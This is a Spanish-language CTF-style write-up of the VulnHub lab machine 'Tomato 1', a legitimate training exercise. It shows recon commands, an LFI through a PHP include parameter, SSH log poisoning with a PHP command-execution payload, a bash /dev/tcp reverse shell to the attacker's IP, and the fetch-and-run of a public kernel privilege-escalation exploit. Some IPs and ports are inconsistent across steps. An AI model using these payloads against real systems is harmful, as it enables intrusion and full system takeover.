---
layout: single
title: Tomato 1 - VulnHub
excerpt: "Medium difficulty machine in which an LFI is exploited, gaining access to the SSH log and using a not so common privilege escalation method."
date: 2023-02-20
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-tomato1/tomato1.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - SSH log poisoning
  - LFI
  - C
  - Kernel
  - Ubuntu
  - PHP
---

Medium difficulty machine in which an LFI is exploited, gaining access to the SSH log and using a not so common privilege escalation method.

# Summary
- IP: 192.168.1.40
- Ports: 21,80,2211,8888
- OS: Linux (Ubuntu Xenial)
- Services & Applications:
	-  21 -> vsftpd 3.0.3
	-  80 -> Apache httpd 2.4.18
	-  2211 -> OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
	-  8888 -> nginx 1.10.3

# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.1.36 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p21,22,80 -sCV 192.168.1.36 -oN targeted
```


# Análisis de página web (puerto 80)

- En la web principal solo vemos la imagen de un tomate, hacemos escaneo de directorios con gobuster:

```bash
$gobuster dir -u 192.168.1.40 -w /home/dante/SecLists/Discovery/Web-Content/common.txt -t 100
```

- Encontramos el directorio "/antibot_image" accedemos a él.


# LFI y SSH log poisoning:

- Dentro encontramos una carpeta "/antibots" la abrimos y vemos varios archivos y directorios, el recurso "info.php" resulta sospechoso así que lo abrimos.

- Si revisamos el código fuente de este recurso nos encontramos con la siguiente linea:

```php
<!-- </?php include $_GET['image']; -->
```

- Lo cual nos hace sospechar de la existencia del parámetro "image" que nos puede derivar a un LFI, así que probamos accediendo al típico archivo "/etc/passwd" del sistema:

```
view-source:http://192.168.1.40/antibot_image/antibots/info.php?image=/etc/passwd
```

- Y al final de todo el contenido podemos ver la información del "/etc/passwd" confirmando así el LFI; enumeramos usuarios desde la terminal para mayor comodidad:

```bash
$curl -s "http://192.168.1.40/antibot_image/antibots/info.php?image=/etc/passwd" | grep "sh$"
```

```
root:x:0:0:root:/root:/bin/bash
tomato:x:1000:1000:Tomato,,,:/home/tomato:/bin/bash
```

- Buscamos archivos de logs para derivar el LFI a RCE, primero, enumerando el log de SSH:

```bash
$curl -s "http://192.168.1.40/antibot_image/antibots/info.php?image=/var/log/auth.log" | awk '/<\/div><\/body><\/html>/,0'
```

- Sí que existe el archivo y podemos visualizar su contenido, esto lo podemos aprovechar para realizar un SSH log poisoning, el cual nos permitirá la ejecución de comandos dentro del sistema de la máquina víctima (RCE).

- Para realizar el log poisoning, primero intentamos acceder vía SSH a la máquina víctima, escribiendo en la parte de "usuario" código PHP malicioso el cual será interpretado por el navegador:

```bash
$ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.40 -p 2211
```

- Con esto hecho, el archivo de log SSH ya debería estar envenenado, accedemos a este por el navegador y mediante el parámetro "cmd" que hemos creado, ejecutamos comandos:

```
view-source:http://192.168.1.40/antibot_image/antibots/info.php?image=/var/log/auth.log&cmd=ls -l /
```

- Confirmamos así el RCE y lo único que resta por hacer es entablar una reverse shell para ganar acceso al sistema:

```
view-source:http://192.168.1.40/antibot_image/antibots/info.php?image=/var/log/auth.log&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.63/443 0>%261"
```



# ESCALANDO PRIVILEGIOS:

- Hacemos una búsqueda típica de posibles vectores de escalada de privilegios pero no encontramos nada interesante.

- Revisamos la versión del sistema:

```bash
$lsb_release -a
```

```bash
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04 LTS
Release:	16.04
Codename:	xenial
```

```bash
$uname -a
```

```bash
Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```


- En nuestra máquina atacante buscamos vulnerabilidades para esta versión del sistema, haciendo hincapié en vulnerabilidades a nivel de Kernel y que nos permita la escalada de privilegios:

```bash
$searchsploit linux kernel local privilege escalation 16.04 4.4
```

- Encontramos un exploit escrito en c:

```bash
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                               | linux/local/45010.c
```

- Lo descargamos, lo compilamos, y lo transferimos a la máquina víctima:

```bash
$searchsploit -m linux/local/45010.c
$gcc 45010.c -o exploit
$python3 -m http.server 80
```

- En la máquina víctima:

```bash
$cd /tmp/
$wget 192.168.1.31:8000/exploit
$chmod +x exploit
$./exploit
```

- Y seremos root.
